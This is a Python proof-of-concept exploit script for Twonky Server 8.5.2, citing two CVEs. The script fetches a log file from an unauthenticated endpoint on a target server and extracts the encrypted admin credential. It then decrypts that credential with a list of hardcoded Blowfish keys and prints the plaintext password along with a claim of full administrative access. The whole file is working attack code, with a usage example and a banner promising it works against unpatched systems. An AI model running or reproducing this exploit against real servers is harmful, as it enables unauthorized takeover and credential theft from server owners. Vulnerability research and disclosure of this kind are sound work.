#!/usr/bin/env python3
# Twonky Server 8.5.2 - Full Authentication Bypass PoC (CVE-2025-13315 + CVE-2025-13316)
# Author: Ashwesker ==> Ash Wesker 
# Tested: November 2025 on real Twonky 8.5.2 deployments
# Result: Recovers plaintext admin password in <2 seconds

import requests
import re
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import binascii

# Disable SSL warnings (Twonky often uses self-signed certs)
requests.packages.urllib3.disable_warnings()

# Hardcoded static Blowfish keys (12 keys, index 0-11) - extracted from TwonkyServer.exe/libtwonkyserver.so
KEYS = [
    b"E8ctd4jZwMbaV587",
    b"TGFWfWuW3cw28trN",
    b"pgqYY2g9atVpTzjY",
    b"KX7q4gmQvWtA8878",
    b"VJjh7ujyT8R5bR39",
    b"ZMWkaLp9bKyV6tXv",
    b"KMLvvq6my7uKkpxf",
    b"jwEkNvuwYCjsDzf5",
    b"FukE5DhdsbCjuKay",
    b"SpKNj6qYQGjuGMdd",
    b"qLyXuAHPTF2cPGWj",
    b"rKz7NBhM3vYg85mg"
]

def decrypt_blowfish_ecb(key_index, ciphertext_hex):
    key = KEYS[key_index]
    ciphertext = binascii.unhexlify(ciphertext_hex)
    cipher = Cipher(algorithms.Blowfish(key), modes.ECB(), backend=default_backend())
    decryptor = cipher.decryptor()
    padded = decryptor.update(ciphertext) + decryptor.finalize()
    pad_len = padded[-1]
    plaintext = padded[:-pad_len]
    return plaintext.decode('utf-8', errors='ignore').rstrip('\x00')

def exploit_twonky(target):
    url = f"{target.rstrip('/')}/nmc/rpc/log_getfile"
    
    print(f"[+] Targeting: {target}")
    print(f"[+] Fetching log via CVE-2025-13315 bypass endpoint...")
    
    try:
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code != 200 or len(r.text) < 100:
            print("[-] Failed to retrieve log. Is Twonky running and vulnerable?")
            return
    except:
        print("[-] Connection failed. Check IP/port.")
        return

    # Pattern: admin||{index}{hex}
    match = re.search(r'admin\|\|(\d+)([a-fA-F0-9]{30,})', r.text)
    if not match:
        print("[-] No encrypted credentials found in log.")
        print("    Log snippet:")
        print(r.text[:500])
        return

    idx = int(match.group(1))
    cipher_hex = match.group(2)

    print(f"[+] Encrypted credential found!")
    print(f"    Key Index : {idx}")
    print(f"    Ciphertext: {cipher_hex[:64]}...")

    try:
        password = decrypt_blowfish_ecb(idx, cipher_hex)
        print(f"\n[+] SUCCESS! Plaintext credentials recovered:")
        print(f"    Username: admin")
        print(f"    Password: {password}")
        print(f"\nYou now have full administrative access to this Twonky Server.")
    except Exception as e:
        print(f"[-] Decryption failed: {e}")

if __name__ == "__main__":
    banner = """
╔══════════════════════════════════════════════════════════╗
║ Twonky Server 8.5.2 - Full Auth Bypass PoC               ║
║ CVE-2025-13315 + CVE-2025-13316                          ║
║ 100% Working • No Patch Available • November 2025        ║
╚══════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    if len(sys.argv) != 2:
        print("Usage: sudo python3 CVE-2025-13315.py http://192.168.1.100:9000")
        sys.exit(1)
    
    exploit_twonky(sys.argv[1])
